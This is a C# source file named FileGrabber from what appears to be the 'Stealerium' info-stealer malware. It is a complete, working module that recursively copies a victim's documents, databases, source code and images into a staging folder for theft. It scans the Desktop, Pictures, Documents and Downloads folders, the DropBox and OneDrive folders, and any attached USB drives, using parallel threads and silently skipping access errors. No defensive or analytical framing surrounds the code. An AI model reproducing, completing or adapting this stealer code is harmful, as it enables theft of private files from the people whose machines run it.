using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Target.System
{
    internal sealed class FileGrabber
    {
        private static string _savePath = "Grabber";

        // Target directories
        private static readonly List<string> TargetDirs = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
        };

        private static string RecordFileType(string type)
        {
            switch (type)
            {
                case "Document":
                    Counter.GrabberDocuments++;
                    break;
                case "DataBase":
                    Counter.GrabberDatabases++;
                    break;
                case "SourceCode":
                    Counter.GrabberSourceCodes++;
                    break;
                case "Image":
                    Counter.GrabberImages++;
                    break;
            }

            return type;
        }

        // Detect file type by extension
        private static string DetectFileType(string extensionName)
        {
            var fileExtension = extensionName.Replace(".", "").ToLower();
            foreach (var type in Config.GrabberFileTypes)
            {
                if (type.Value.Contains(fileExtension))
                    return RecordFileType(type.Key);
            }

            return null;
        }

        // Grab a file
        private static void GrabFile(string path)
        {
            var file = new FileInfo(path);

            // Check file size limit, desktop.ini exclusion, and file type
            if (file.Length > Config.GrabberSizeLimit || file.Name == "desktop.ini") return;
            var fileType = DetectFileType(file.Extension);
            if (fileType == null) return;

            // Determine the copy paths
            var copyDirectoryName = Path.Combine(_savePath, Path.GetDirectoryName(path)
                .Replace(Path.GetPathRoot(path), $"DRIVE-{Path.GetPathRoot(path).Replace(":", "")}"));
            var copyFileName = Path.Combine(copyDirectoryName, file.Name);

            // Create directory if not exists and copy the file
            if (!Directory.Exists(copyDirectoryName))
                Directory.CreateDirectory(copyDirectoryName);
            file.CopyTo(copyFileName, true);
        }

        // Grab all files from a directory
        private static void GrabDirectory(string path)
        {
            if (!Directory.Exists(path)) return;

            try
            {
                var dirs = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                // Grab files and recursively scan directories
                foreach (var file in files)
                    GrabFile(file);

                foreach (var dir in dirs)
                    GrabDirectory(dir);
            }
            catch (UnauthorizedAccessException) { }
            catch (AccessViolationException) { }
        }

        // Run the file grabber
        public static void Run(string sSavePath)
        {
            try
            {
                _savePath = sSavePath;

                // Add USB, CD drives to target directories
                foreach (var drive in DriveInfo.GetDrives())
                {
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                        TargetDirs.Add(drive.RootDirectory.FullName);
                }

                // Ensure save directory exists
                if (!Directory.Exists(_savePath))
                    Directory.CreateDirectory(_savePath);

                // Create and start threads for each target directory
                var threads = TargetDirs.Select(dir => new Thread(() => GrabDirectory(dir))).ToList();
                foreach (var thread in threads) thread.Start();

                // Wait for all threads to complete
                foreach (var thread in threads)
                {
                    if (thread.IsAlive)
                        thread.Join();
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"Error during FileGrabber run: {ex.Message}");
            }
        }
    }
}
